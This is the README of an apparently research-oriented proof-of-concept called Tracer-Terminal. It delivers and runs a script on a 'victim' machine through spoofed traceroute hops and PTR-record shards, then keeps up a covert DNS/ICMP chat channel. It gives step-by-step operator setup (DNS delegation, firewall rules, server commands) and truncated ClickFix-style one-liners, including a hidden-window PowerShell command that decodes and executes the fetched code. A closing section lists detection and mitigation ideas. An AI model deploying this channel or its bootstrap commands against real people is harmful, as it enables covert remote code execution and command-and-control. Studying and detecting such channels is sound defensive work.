# Tracer-Terminal / Tracer-Talk

A proof-of-concept demonstrating DNS covert channels via `tracert`/`traceroute`. The server (Orchestrator) delivers an encrypted chat client through ICMP fake hops and maintains full-duplex encrypted chat -- all disguised as routine network diagnostic traffic. The vulnerability design is called **Tracer-Terminal**; the chat protocol it enables is **Tracer-Talk**.

**For security research purposes only. See [LICENSE](LICENSE) for terms and disclaimer.**

## How It Works

The Orchestrator listens on port 53 (DNS) and ICMP. When a "victim" or remote actor runs a `tracert` command (via a ClickFix-style one-liner), the server:

1. Responds to the DNS A-record query for the target subdomain (the resolved IP doubles as the XOR encryption key)
2. Creates fake ICMP hops by responding with "Time Exceeded" messages from spoofed IPs
3. Serves PTR records for each spoofed IP containing encrypted hex-encoded payload shards in **stealth hostnames** that look like transit routers (e.g. `ge-0-0-1.4a6f686e.nyc.lab.yourdomain.com`)
4. The victim's `tracert` output displays these shard hostnames; the one-liner extracts hex-only labels, decodes, and executes

The delivered payload is a compact chat client that continues to communicate bidirectionally over tracert commands.

## Architecture

```
                  Orchestrator (Python)
                  +-------------------------------+
                  |  DNS Handler (port 53)        |  <-- Subdomain command routing
                  |  ICMP Tunnel (Scapy)          |  <-- Fake hop factory
                  |  Client Hub                   |  <-- Unique ID per client via
                  |    ICMP Fingerprinting        |      OS detection (TTL + payload)
                  |    Session Store              |      Multi-client multiplexing
                  |  Shard Encoder                |  <-- Payload chunking + XOR crypto
                  |  Chat CLI                     |  <-- Server operator interface
                  +-------------------------------+
                              |
                 tracert / traceroute queries
                              |
                  +-------------------------------+
                  |  Client (zero dependencies)   |
                  |  Bootstrap one-liner           |  <-- tracert | findstr | decode | exec
                  |  Chat client (.bat/.ps1/.sh)   |  <-- Full-duplex tracert chat
                  +-------------------------------+
```

The **Client Hub** assigns each client a stable 16-character hex ID derived from a composite of their source IP and ICMP fingerprint (initial TTL and payload hash). This means two different machines behind the same NAT are distinguished if they run different operating systems (Windows TTL=128 vs Linux TTL=64). The server operator selects clients by ID prefix, full ID, or IP address.

## Subdomain Command Map

All client communication uses `tracert [command].lab.yourdomain.com`:

| Pattern | Direction | Purpose |
|---------|-----------|---------|
| `payload.lab.d.com` | Downlink | Deliver chat client as encrypted PTR shards across fake hops |
| `key.lab.d.com` | Downlink | A-record IP = 4-byte XOR session key |
| `[hex].tx.lab.d.com` | Uplink | Client sends XOR-encrypted hex-encoded message in subdomain |
| `rx.lab.d.com` | Downlink | Client polls for messages via fake-hop PTR shards |
| `end.lab.d.com` | Uplink | Session teardown |

## Shard Capacity

Each fake hop carries a PTR hostname up to 253 characters (RFC 1035). Hostnames are **stealth-formatted**: a random prefix label (e.g. `ge-0-0-1`, `cr1`, `nyc`), then hex payload labels, then a random suffix label (e.g. `nyc`, `lax`), then the domain. The shard encoder auto-calculates capacity:

- FQDN limit: 253 chars
- Domain suffix + stealth prefix/suffix: ~37 chars reserved
- Available per hop: ~210 hex chars across labels (~105 bytes), each label even-length for clean byte boundaries
- Default 30-hop tracert with ~28 usable hops: **~2,940 bytes** max payload

## Prerequisites

**Server** (Linux recommended):
- Python 3.10+
- Root/admin access (raw sockets + port 53)

**Client** (zero external dependencies):
- Windows: `tracert.exe` + `powershell.exe` (built-in)
- Linux/macOS: `traceroute` + `bash` + `grep` (standard)

## Quick Start

### Step 1: DNS Configuration (One-Time Setup)

Go to your domain registrar's DNS management panel and add two records. This delegates a subdomain zone to your own server so it becomes the authoritative DNS for all `*.lab.yourdomain.com` queries.

**Record 1 -- Glue A Record** (tells the internet where your nameserver lives):

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `ns1` | A | 30 min | `YOUR_SERVER_PUBLIC_IP` |

**Record 2 -- NS Delegation** (delegates the `lab` subdomain to your nameserver):

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `lab` | NS | 30 min | `ns1.yourdomain.com` |

**Example** using `example.com` with server at `203.0.113.50`:

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `ns1` | A | 30 min | `203.0.113.50` |
| `lab` | NS | 30 min | `ns1.example.com` |

After this, any DNS query for `*.lab.example.com` anywhere in the world will be routed to your server on port 53.

**Registrar-specific notes:**
- **Cloudflare**: The `ns1` A record must be "DNS Only" (grey cloud icon). Cloudflare's proxy does not forward port 53.
- **GoDaddy / Namecheap / Porkbun**: Standard DNS panel, add the records directly.
- **Home IP (Comcast, etc.)**: Works if you have a static IP. Port 53 may be blocked by some residential ISPs -- verify with `nslookup test.lab.yourdomain.com` from an external machine.

Allow up to 30 minutes for DNS propagation.

### Step 2: Configure the Server

Edit `server/config.py` and set your domain and public IP:

```python
DOMAIN_ZONE = "lab.yourdomain.com"   # must match your NS delegation
SERVER_IP = "YOUR_SERVER_PUBLIC_IP"   # the IP from your glue A record
```

The `SERVER_IP` also becomes the 4-byte XOR encryption key (its octets), and is what `tracert` displays in its header line. Optional: `COMPRESS_PAYLOAD` (default True) and `STEALTH_RESERVED` (chars for prefix/suffix labels) are in the same file.

### Step 3: Install Dependencies

```bash
pip install -r requirements.txt
```

Requires only `dnslib` and `scapy`. Python 3.10+ recommended.

### Step 4: Open Firewall and Suppress Kernel ICMP

The server needs port 53 (DNS) and ICMP open inbound. On Linux, the kernel must NOT reply to ICMP Echo Requests -- Scapy handles that instead to create the fake hops.

```bash
# Allow DNS and ICMP inbound
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 53 -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT

# CRITICAL: suppress kernel ICMP echo-reply so only Scapy responds
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
```

If behind a home router, also port-forward UDP 53, TCP 53, and ICMP to your server's local IP.

### Step 5: Generate Client Scripts

The client scripts and bootstrap one-liners in `clients/` and `bootstrap/` are **templates** with `{{DOMAIN_ZONE}}`, `{{SERVER_IP}}`, etc. placeholders. Run the generator to stamp out working copies:

```bash
python generate.py
# Or override config on the command line:
python generate.py --domain lab.example.com --ip 203.0.113.50
```

This creates a `build/` folder with ready-to-use client scripts and bootstraps.

### Step 6: Start the Orchestrator

Run from the project root directory (`tracerterminal/`). Point `--payload` at the **generated** client, not the template:

```bash
# Deliver the PowerShell chat client to Windows targets
sudo python -m server.orchestrator --payload build/clients/chat_client.ps1

# Or the Bash client for Linux/macOS targets
sudo python -m server.orchestrator --payload build/clients/chat_client.sh

# Or the CMD batch client
sudo python -m server.orchestrator --payload build/clients/chat_client.bat
```

You can also override config values from the command line:

```bash
sudo python -m server.orchestrator \
  --payload build/clients/chat_client.ps1 \
  --domain lab.example.com \
  --ip 203.0.113.50
```

Root/admin is required for Scapy raw sockets and binding to port 53.

### Step 7: Verify DNS Delegation

From any external machine (not the server), run:

```
nslookup test.lab.yourdomain.com
```

You should see the query arrive in the orchestrator's console output. If it does, the full NS delegation chain is working and the server is ready for clients.

### Step 8: Send the Bootstrap to a Client

Give the target the appropriate one-liner from `bootstrap/`. See [clients/README.md](clients/README.md) for details on how each bootstrap and chat client works.

## Usage

### Server Side

```
[*] Tracer Terminal Orchestrator
[*] Domain zone: lab.example.com
[*] Server IP / XOR key: 203.0.113.50 -> [203, 0, 113, 50]
[*] Payload loaded: build/clients/chat_client.ps1 (1009 bytes)
[*] Payload encoded into 6 data shards + end marker
[*] Server ready. Waiting for connections...
[*] Commands: /list  /select <id|ip>  /info <id|ip>  /quit

[+] New client: 9ff531e2(198.51.100.25) [Windows]
[>] Delivering payload (6 shards)

server> /list
  9ff531e2  198.51.100.25  [DELIVERING]  Windows       in:0 out:0  last:3s <--

server> /select 9ff5
[*] Selected: 9ff531e2(198.51.100.25)

server> Hello from the server!
[*] Queued for 9ff531e2(198.51.100.25) (will deliver on next rx poll)

[9ff531e2(198.51.100.25)] Hi back!

server> /info 9ff5
  Client ID:    9ff531e2a1b3c4d5
  Source IP:     198.51.100.25
  State:         CHATTING
  OS hint:       Windows
  Initial TTL:   128
  Payload hash:  a3b1c2d4e5f60718
  Inbox:         1 messages
  Outbox:        0 messages
  Last seen:     12s ago
```

### Client Side (Bootstrap)

The victim pastes one of the **generated** one-liners from `build/bootstrap/`. Each uses only built-in OS tools:

**PowerShell** (copy-paste into PowerShell or Win+R):
```
powershell -w h -nop -c "$z='lab.example.com';$t=tracert payload.$z;..."
```
(See `build/bootstrap/bootstrap_ps.txt` for the full command)

**CMD** (copy-paste into cmd.exe):
```
@tracert payload.lab.example.com>%tmp%\tt.txt&powershell -nop -w h -c "..."
```
(See `build/bootstrap/bootstrap_cmd.txt` for the full command)

**Bash** (copy-paste into terminal):
```bash
z=lab.example.com;t=$(traceroute payload.$z 2>&1);k=(203 0 113 50);...
```
(See `build/bootstrap/bootstrap_bash.txt` for the full command)

### Chat Client (After Delivery)

Once the bootstrap delivers and executes the chat client:

```
=== Tracer Terminal Chat ===
Type message, Enter to send. /quit to exit.
you: Hello from the client!
server: Hello from the server!
you: /quit
Disconnected.
```

## Protocol Flow

```
                   Client                          Server
                     |                               |
  Bootstrap:         |  tracert payload.lab.d.com    |
  1. DNS A query --> |  --------------------------> |  [Orchestrator routes to PayloadBuilder]
  2. ICMP probes --> |  --------------------------> |  [ICMP Tunnel: fake hops with PTR shards]
  3. PTR lookups <-- |  <-------------------------- |  [DNS: shard hostnames per hop]
  4. Decode+exec     |                               |
                     |                               |
  Chat loop:         |                               |
  5. Send msg:       |  tracert [hex].tx.lab.d.com  |
     DNS query ----> |  --------------------------> |  [UplinkParser: extract message]
                     |                               |
  6. Poll:           |  tracert rx.lab.d.com        |
     ICMP probes --> |  --------------------------> |  [MsgBuilder: fake hops with response]
     PTR lookups <-- |  <-------------------------- |  [DNS: message shards]
  7. Decode+display  |                               |
```

## Encryption

- **Algorithm**: XOR with 4-byte repeating key
- **Key source**: Server IP address octets (e.g., `203.0.113.50` = `[0xCB, 0x00, 0x71, 0x32]`)
- **Encoding**: Hex (0-9, a-f) for DNS-safe transport
- **Compression (when available on client)**: With `COMPRESS_PAYLOAD = True` in `config.py`, the server gzips payloads and downlink (rx) messages before encoding. Clients detect gzip magic (`1f 8b 08`) after XOR decrypt and decompress using built-in tools (PowerShell: `GZipStream`; Bash: `gzip -dc`; CMD: PowerShell). Uncompressed payloads still work (no magic = use bytes as-is).
- **Minified clients**: `.min.` variants strip whitespace, comments, and verbose names for ~20-30% smaller payloads and fewer hops

## File Structure

```
tracerterminal/
  server/
    orchestrator.py       # Director: wires components, manages sessions, chat CLI
    dns_handler.py        # dnslib DNS server with subdomain command routing
    icmp_tunnel.py        # Scapy ICMP fake-hop factory
    shard_encoder.py      # Payload chunking, XOR crypto, hex encoding, stealth hostnames, optional gzip
    config.py             # Domain, IP, capacity constants, COMPRESS_PAYLOAD, STEALTH_RESERVED -- EDIT THIS FIRST
  clients/                # TEMPLATES with {{placeholders}}
    chat_client.bat       # CMD chat client template (readable)
    chat_client.ps1       # PowerShell chat client template (readable)
    chat_client.sh        # Bash chat client template (readable)
    chat_client.min.bat   # CMD minified (~17% smaller)
    chat_client.min.ps1   # PowerShell minified (~21% smaller)
    chat_client.min.sh    # Bash minified (~31% smaller)
    README.md             # How the clients and protocol work
  bootstrap/              # TEMPLATES with {{placeholders}}
    bootstrap_cmd.txt     # CMD one-liner template
    bootstrap_ps.txt      # PowerShell one-liner template
    bootstrap_bash.txt    # Bash one-liner template
  generate.py             # Stamps out working clients/bootstraps from templates + config
  build/                  # Generated output (gitignored) -- use these files
  requirements.txt
  README.md
```

## Security Research Context

This PoC demonstrates that:

1. **tracert/traceroute output can be weaponized** as a payload delivery mechanism by spoofing ICMP hops and controlling PTR records
2. **DNS subdomain queries** provide a covert uplink channel that looks like routine diagnostic traffic
3. **Standard network monitoring** focused on TCP/HTTP is blind to this ICMP+DNS channel
4. **No special client software** is needed -- the attack uses only built-in OS diagnostic tools

Related work:
- ClickFix attacks (2026) extracting payloads from DNS Name fields
- MITRE ATT&CK FGT1048.501 (Covert DNS Exfiltration)
- CWE-350 (Reliance on Reverse DNS for security decisions)
- DNS tunneling campaigns (TrkCdn, Iodine, DNSCat2)

## Mitigations

- **Disable PTR in diagnostics**: Enforce `tracert -d` / `traceroute -n` via Group Policy or shell aliases to prevent hostname resolution
- **PTR hostname structure**: Stealth hostnames look like `ge-0-0-1.4a6f686e.nyc.lab.example.com` (prefix + hex labels + suffix). Detection requires parsing labels and flagging those that are pure hex of even length, or correlating many PTRs under the same domain from different IPs in one trace
- **ICMP Time Exceeded anomaly detection**: Real intermediate routers send Time Exceeded with TTL values that decrease with hop distance; fake hops from a single server all arrive with the same TTL (configurable, default 60), which is unusual for routers at different points in a path
- **ICMP rate limiting**: A single tracert generates 3 probes per hop across 30 hops = 90 packets in rapid succession to the same destination -- rate limiting ICMP to a single target can throttle or break the delivery
- **ICMP Time Exceeded source correlation**: Fake hops use randomized public IPs from realistic transit ranges, but all arrive from the same physical server. Network taps comparing the ethernet source MAC or upstream router for Time Exceeded packets would reveal they all originate from the same path
- **DNS PTR response domain clustering**: While per-hop timing is randomized to look natural, the PTR responses all resolve to hostnames under the same domain -- passive DNS logs showing a dozen PTR records all pointing to `*.lab.yourdomain.com` from different IPs in a single trace is unusual
- **Outbound ICMP restrictions**: Blocking ICMP Echo Request at the perimeter kills tracert entirely, though this has operational trade-offs (breaks path MTU discovery and basic troubleshooting)
